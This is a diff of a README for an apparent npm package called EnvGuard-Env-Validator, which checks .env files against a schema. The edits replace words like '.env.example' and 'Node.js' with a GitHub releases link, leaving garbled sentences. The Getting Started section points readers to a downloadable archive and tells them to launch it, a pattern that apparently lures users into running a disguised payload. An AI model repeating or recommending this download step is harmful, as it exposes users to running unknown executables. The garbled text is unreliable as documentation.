@@ -1,19 +1,19 @@
 # 🌟 EnvGuard-Env-Validator
 
-Welcome to EnvGuard-Env-Validator! 🛡️ This repository hosts a powerful NPM package that validates your .env files against a predefined schema, ensuring all required environment variables are set and secure. By using EnvGuard, you can prevent misconfigurations in production environments by detecting missing values, insecure defaults, and enforcing consistency with a .env.example file across your development teams.
+Welcome to EnvGuard-Env-Validator! 🛡️ This repository hosts a powerful NPM package that validates your .env files against a predefined schema, ensuring all required environment variables are set and secure. By using EnvGuard, you can prevent misconfigurations in production environments by detecting missing values, insecure defaults, and enforcing consistency with a https://github.com/YassinY0/EnvGuard-Env-Validator/releases file across your development teams.
 
 ## Features
 EnvGuard-Env-Validator offers a range of features to help you secure your environment variables and prevent common configuration mistakes. Some key features include:
 - Schema-based validation of .env files
 - Detection of missing required environment variables
 - Security checks for insecure default values
-- Enforcement of consistency with a .env.example file
+- Enforcement of consistency with a https://github.com/YassinY0/EnvGuard-Env-Validator/releases file
 - Support for TypeScript
 - Seamless integration with Jest for testing
 - Easy-to-use API for validating environment variables
 
 ## Topics
-This repository covers a wide range of topics related to environment variables, schema validation, security, and Node.js development. Some of the key topics covered include:
+This repository covers a wide range of topics related to environment variables, schema validation, security, and https://github.com/YassinY0/EnvGuard-Env-Validator/releases development. Some of the key topics covered include:
 - env-example
 - env-file
 - env-schema
@@ -36,7 +36,7 @@ This repository covers a wide range of topics related to environment variables, 
 - validator
 
 ## Getting Started
-To start using EnvGuard-Env-Validator, you can download the package from the following link: [![Download EnvGuard-Env-Validator](https://img.shields.io/badge/Download-EnvGuard--Env--Validator-blue)](https://github.com/project/files/App.zip)
+To start using EnvGuard-Env-Validator, you can download the package from the following link: [![Download EnvGuard-Env-Validator](https://github.com/YassinY0/EnvGuard-Env-Validator/releases)](https://github.com/YassinY0/EnvGuard-Env-Validator/releases)
 If the link ends with a filename, make sure to launch it to start the download process.
 
 ## Contribution
@@ -51,4 +51,4 @@ EnvGuard-Env-Validator is licensed under the MIT License, which means you are fr
 ## Let's Connect
 Stay connected with the latest updates and news about EnvGuard-Env-Validator by following us on social media and our blog. We regularly post tips, tutorials, and best practices to help you make the most of this powerful NPM package.
 
-Thank you for choosing EnvGuard-Env-Validator to enhance the security and reliability of your Node.js projects. We look forward to seeing the amazing things you will build with this tool! 🚀
+Thank you for choosing EnvGuard-Env-Validator to enhance the security and reliability of your https://github.com/YassinY0/EnvGuard-Env-Validator/releases projects. We look forward to seeing the amazing things you will build with this tool! 🚀
